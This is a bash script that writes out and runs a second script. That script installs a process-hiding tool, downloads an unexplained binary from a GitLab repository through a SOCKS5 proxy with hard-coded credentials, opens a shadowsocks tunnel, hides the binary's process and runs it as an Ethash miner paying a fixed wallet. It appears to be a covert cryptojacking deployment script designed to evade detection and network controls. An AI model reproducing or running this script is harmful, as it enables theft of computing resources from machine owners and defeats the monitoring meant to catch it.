#!/bin/bash
cat << "EOF" > run.sh

#!/bin/bash
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 192.186.186.7:6049
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep .2
./graftcp/graftcp curl ifconfig.me
echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/145
chmod +x 145

apt -y install shadowsocks-libev rng-tools
ss-local -s 192.186.186.7 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
ph add 145
./145 --algo ETHASH --pool eth.2miners.com:2020 --user 0x9BACCB443D4EEe6831B541ac17c28C1b61FDaB81.$(echo "$(curl -s ifconfig.me)" | tr . _ )-monakis
EOF

chmod +x run.sh

./run.sh
